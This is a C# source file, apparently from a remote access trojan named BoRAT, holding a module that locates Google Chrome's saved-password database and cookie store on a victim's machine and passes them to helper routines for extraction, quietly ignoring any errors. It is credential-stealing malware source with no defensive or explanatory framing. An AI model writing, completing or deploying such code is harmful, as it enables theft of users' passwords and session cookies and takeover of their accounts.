using System;
using System.Collections.Generic;
using System.IO;

namespace BoRAT.Core.Recovery.Browsers
{
    class Chrome
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
